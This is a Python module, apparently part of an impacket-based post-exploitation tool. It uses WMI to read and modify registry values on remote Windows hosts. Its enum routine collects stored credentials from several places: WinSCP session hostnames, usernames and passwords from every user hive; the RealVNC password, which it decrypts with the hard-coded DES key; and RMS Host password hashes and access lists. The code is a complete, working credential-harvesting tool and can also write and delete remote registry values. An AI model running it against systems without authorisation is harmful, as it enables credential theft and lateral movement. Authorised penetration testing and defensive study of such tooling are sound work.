from base64 import b64decode
from binascii import Error as BinasciiError, unhexlify
from enum import Enum
from typing import Optional
from xml.etree import ElementTree

from Cryptodome.Cipher import DES
from impacket.ldap.ldaptypes import ACL, SR_SECURITY_DESCRIPTOR

from wmipg.common import WMIConnector

REG_MAP = {
    "HKU": 2147483651,
    "HKLM": 2147483650,
}

REALVNC_DES_KEY = bytes.fromhex("e84ad660c4721ae0")
REALVNC_DES_IV = bytes(8)


def parse_reg_key(key_name) -> tuple[int, str]:
    components = key_name.split("\\")
    path = "\\".join(components[1:])
    hive = REG_MAP[components[0].upper()]
    return hive, path


class RegValueTypeEnum(Enum):
    binary = "binary"
    dword = "dword"
    qword = "qword"
    string = "string"

    @staticmethod
    def from_string(s):
        try:
            return RegValueTypeEnum[s]
        except KeyError:
            raise ValueError()


class RegValueReturnTypeEnum(Enum):
    REG_SZ = 1
    REG_EXPAND_SZ = 2
    REG_BINARY = 3
    REG_DWORD = 4
    REG_MULTI_SZ = 7
    REG_QWORD = 11


class Registry:
    wmi: WMIConnector

    def __init__(self, wmi_connector: WMIConnector):
        self.wmi = wmi_connector

    def get(self, _: str):
        return self.wmi.get_class_instances("SMS_Query")

    def enum(self):
        srp, _ = self.wmi.iWbemServices.GetObject("StdRegProv")
        hku = REG_MAP["HKU"]
        users = srp.EnumKey(hku, "").sNames

        res = {}
        winscp = r"Software\Martin Prikryl\WinSCP 2\Sessions"
        winscp_res = {}
        for user in users:
            path = "%s\\%s" % (user, winscp)
            sessions = srp.EnumKey(hku, path).sNames
            if sessions:
                winscp_res[user] = {}
                for session in sessions:
                    spath = rf"{path}\{session}"
                    winscp_res[user][session] = {
                        "HostName": self._reg_get_string(
                            srp, hku, spath, "HostName"
                        ),
                        "Password": self._reg_get_string(
                            srp, hku, spath, "Password"
                        ),
                        "UserName": self._reg_get_string(
                            srp, hku, spath, "UserName"
                        ),
                    }

        res["WinSCP"] = winscp_res
        res["RealVNC"] = self._enum_realvnc(srp)
        res["RMSHost"] = self._enum_rms_host(srp)
        return res

    def _enum_realvnc(self, srp):
        hklm = REG_MAP["HKLM"]
        path = r"Software\RealVNC\WinVNC4"
        realvnc_res = {
            "PortNumber": self._reg_get_string(srp, hklm, path, "PortNumber"),
            "HTTPPortNumber": self._reg_get_string(
                srp, hklm, path, "HTTPPortNumber"
            ),
        }

        encrypted_password = self._reg_get_string(srp, hklm, path, "Password")
        if encrypted_password:
            realvnc_res["PasswordEncrypted"] = encrypted_password
            try:
                realvnc_res["Password"] = self._decrypt_realvnc_password(
                    encrypted_password
                )
            except ValueError as e:
                realvnc_res["Password"] = None
                realvnc_res["PasswordError"] = str(e)

        return realvnc_res

    @staticmethod
    def _decrypt_realvnc_password(password: str):
        try:
            encrypted_password = unhexlify(password.strip())
        except (BinasciiError, ValueError) as e:
            raise ValueError("invalid encrypted RealVNC password hex") from e

        cipher = DES.new(REALVNC_DES_KEY, DES.MODE_CBC, iv=REALVNC_DES_IV)
        decrypted_password = cipher.decrypt(encrypted_password).rstrip(b"\x00")

        try:
            return decrypted_password.decode()
        except UnicodeDecodeError:
            return decrypted_password.hex()

    @staticmethod
    def _reg_get_string(srp, hive, path, value):
        return srp.GetStringValue(hive, path, value).sValue

    def _enum_rms_host(self, srp):
        hklm = REG_MAP["HKLM"]
        path = r"Software\TektonIT\RMS Host\Host\Parameters"
        security = self._reg_get_binary(srp, hklm, path, "Security")
        if not security:
            return {}

        try:
            xml_data = bytes(security).decode("utf-8-sig")
        except UnicodeDecodeError as e:
            return {"SecurityDecodeError": str(e)}

        try:
            root = ElementTree.fromstring(xml_data)
        except ElementTree.ParseError as e:
            return {"SecurityParseError": str(e)}

        return self._parse_rms_security_settings(root)

    def _parse_rms_security_settings(self, root):
        windows_security = self._text_or_none(root, "windows_security")
        single_password_hash = self._text_or_none(
            root, "single_password_hash"
        )
        user_access = [
            self._parse_rms_user_access(user)
            for user in root.findall(
                "./my_user_access_list/user_access_list/user_access"
            )
        ]

        res = {
            "Version": root.attrib.get("version"),
            "WindowsSecurityEnabled": bool(windows_security),
            "SinglePasswordEnabled": bool(single_password_hash),
            "SinglePasswordHash": single_password_hash,
            "UserAccessListEnabled": bool(user_access),
            "UserAccessList": user_access,
        }

        if windows_security:
            try:
                res["WindowsSecurity"] = self._decode_windows_security(
                    windows_security
                )
            except ValueError as e:
                res["WindowsSecurityError"] = str(e)

        return res

    def _parse_rms_user_access(self, user):
        return {
            "SID": self._text_or_none(user, "sid"),
            "UserName": self._text_or_none(user, "user_name"),
            "PasswordHash": self._text_or_none(user, "password"),
            "AccessMask": self._int_or_none(user, "access_mask"),
            "Active": self._bool_or_none(user, "active"),
        }

    @staticmethod
    def _decode_windows_security(data):
        try:
            raw_data = b64decode(data.strip(), validate=True)
        except BinasciiError as e:
            raise ValueError("invalid base64 Windows security value") from e

        try:
            sd = SR_SECURITY_DESCRIPTOR(data=raw_data)
            return {
                "Type": "SecurityDescriptor",
                "Control": sd["Control"],
                "OwnerSID": Registry._format_sid(sd["OwnerSid"]),
                "GroupSID": Registry._format_sid(sd["GroupSid"]),
                "DACL": Registry._decode_acl(sd["Dacl"]),
            }
        except Exception:
            pass

        try:
            return {
                "Type": "ACL",
                "DACL": Registry._decode_acl(ACL(data=raw_data)),
            }
        except Exception as e:
            raise ValueError(
                "unable to parse Windows security descriptor"
            ) from e

    @staticmethod
    def _decode_acl(acl):
        if not acl or acl == b"":
            return None

        return {
            "Revision": acl["AclRevision"],
            "AceCount": acl["AceCount"],
            "ACEs": [
                Registry._decode_ace(ace)
                for ace in getattr(acl, "aces", [])
            ],
        }

    @staticmethod
    def _decode_ace(ace):
        ace_data = ace["Ace"]
        res = {
            "Type": ace["TypeName"],
            "Flags": ace["AceFlags"],
        }

        if "Mask" in ace_data.fields:
            res["Mask"] = ace_data["Mask"]["Mask"]

        if "Sid" in ace_data.fields:
            res["SID"] = ace_data["Sid"].formatCanonical()

        return res

    @staticmethod
    def _format_sid(sid):
        if not sid or sid == b"":
            return None

        return sid.formatCanonical()

    @staticmethod
    def _text_or_none(element, path):
        value = element.findtext(path)
        if value is None:
            return None

        return value.strip()

    @staticmethod
    def _int_or_none(element, path):
        value = Registry._text_or_none(element, path)
        if value is None:
            return None

        try:
            return int(value)
        except ValueError:
            return value

    @staticmethod
    def _bool_or_none(element, path):
        value = Registry._text_or_none(element, path)
        if value is None:
            return None

        if value.lower() == "true":
            return True

        if value.lower() == "false":
            return False

        return value

    @staticmethod
    def _reg_get_binary(srp, hive, path, value):
        return srp.GetBinaryValue(hive, path, value).uValue

    def _reg_query_value(
        self, srp, key_name: str, value: Optional[str], type: RegValueTypeEnum
    ):
        hive, path = parse_reg_key(key_name)
        res = None

        match type:
            case RegValueTypeEnum.binary:
                res = srp.GetBinaryValue(hive, path, value).uValue

            case RegValueTypeEnum.dword:
                res = srp.GetDWORDValue(hive, path, value).uValue

            case RegValueTypeEnum.qword:
                res = srp.GetQWORDValue(hive, path, value).sValue

            case RegValueTypeEnum.string:
                res = srp.GetStringValue(hive, path, value).sValue

        return res

    def _reg_enum_path(self, srp, key_name):
        hive, path = parse_reg_key(key_name)
        output = []

        if keys := srp.EnumKey(hive, path).sNames:
            key_name_stripped = key_name.rstrip('\\') + "\\"
            output.extend([f"{key_name_stripped}{x}" for x in keys])

        values = srp.EnumValues(hive, path)
        if values.sNames:
            for name, _vtype in zip(values.sNames, values.Types):
                vtype = RegValueReturnTypeEnum(_vtype)
                output.append(f"{name}\t{vtype.name}")

        return "\n".join(output)

    def query(
        self, key_name: str, value: Optional[str], type: RegValueTypeEnum
    ):
        srp, _ = self.wmi.iWbemServices.GetObject("StdRegProv")

        if value:
            return self._reg_query_value(srp, key_name, value, type)
        else:
            return self._reg_enum_path(srp, key_name)

    def set_value(
        self,
        key_name: str,
        value: str,
        data: str | bytes,
        type: RegValueTypeEnum,
    ):
        srp, _ = self.wmi.iWbemServices.GetObject("StdRegProv")
        hive, path = parse_reg_key(key_name)

        res = None

        match type:
            case RegValueTypeEnum.binary:
                res = srp.SetBinaryValue(hive, path, value, data)

            case RegValueTypeEnum.dword:
                res = srp.SetDWORDValue(hive, path, value, int(data))

            case RegValueTypeEnum.qword:
                res = srp.SetQWORDValue(hive, path, value, int(data))

            case RegValueTypeEnum.string:
                res = srp.SetStringValue(hive, path, value, data)

        return res

    def delete(self, key_name: str, value: str):
        srp, _ = self.wmi.iWbemServices.GetObject("StdRegProv")
        hive, path = parse_reg_key(key_name)

        return srp.DeleteValue(hive, path, value)
